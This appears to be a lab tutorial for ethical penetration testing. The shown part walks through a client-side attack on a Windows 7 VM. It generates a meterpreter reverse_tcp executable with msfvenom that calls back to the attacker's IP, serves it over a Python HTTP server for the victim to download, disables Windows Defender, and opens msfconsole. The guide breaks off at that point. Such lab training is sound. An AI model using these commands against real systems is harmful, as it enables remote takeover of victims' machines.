## lab work revolves around ethical penetration testing using the Cyber Kill Chain model, with two main practical tracks
```
    1. Windows-based client-side attack (via payload delivery and privilege escalation)
    2. Server-side FTP vulnerability exploitation (on Metasploitable Linux)
```
## 🔧 Prerequisites
```
Make sure you have:

    VirtualBox (or VMware)
    Kali Linux (attacker machine)
    Windows 7 VM (victim client) — for Track 1
    Metasploitable Linux 2 (vulnerable server) — for Track 2
    All VMs on the same network mode (Host-only or Bridged as needed)
```

## 🛠️ TRACK 1: Windows-based client-side attack (via payload delivery)
### Step 1: Set Up Vulnerable Windows 7 VM
```
Create a new VM in VirtualBox
Install Windows 7 using an ISO.
Disable Windows Defender:
```

### Step 2: Generate Malicious Payload

Get your Kali IP atfirst:

**Command** - ip a


**Command**: 
```
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<**kali_ip**> lport=4444 -f exe -o any_name.exe
```
Here the payload generation is successful and saved as our given name myexploit.exe 

### Step 3: Host Payload for Delivery
**Command**: 
python3 -m http.server -b <your_machine_ip> <port_number>

**Example**- After that open browser from the victim machine and use the url you just started as server  http://192.168.0.7:8999 

### Now download the payload you have just created. 


System Exploitation & Gaining Access

Step 1: Go to terminal and use the below command to start 
metasploit console 
Command: msfconsole  




